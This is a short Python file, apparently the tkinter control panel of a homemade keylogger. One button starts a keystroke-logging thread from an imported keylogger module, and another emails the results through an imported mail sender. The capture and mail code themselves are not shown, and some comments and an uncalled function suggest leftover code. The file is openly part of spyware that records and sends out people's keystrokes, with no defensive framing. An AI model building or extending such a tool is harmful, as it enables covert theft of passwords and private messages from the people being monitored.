import tkinter as tk
import keylogger_main
import sys
import mail_sender

def send_the_mail():
    mail_sender.sendMail()
def on_closing():
    sys.exit()
    
def create_main_screen():
    home_screen = tk.Tk()
    home_screen.title("Program Main Screen")
    home_screen.geometry("600x400")

    # Create the login button

    


    login_button = tk.Button(home_screen, text="Start the keylogger",command=  main, bg="#00ff00")
    login_button.pack()

    send_mail_button = tk.Button(home_screen, text="Send mail",command= send_the_mail , bg="#00ff00")
    send_mail_button.pack()
    # Create the sign up button


    home_screen.protocol("WM_DELETE_WINDOW", on_closing)
    home_screen.mainloop()
    # Show the window






import threading
def main():
    global t
    t = threading.Thread(target=keylogger_main.keylogger_start)
    t.start()



    
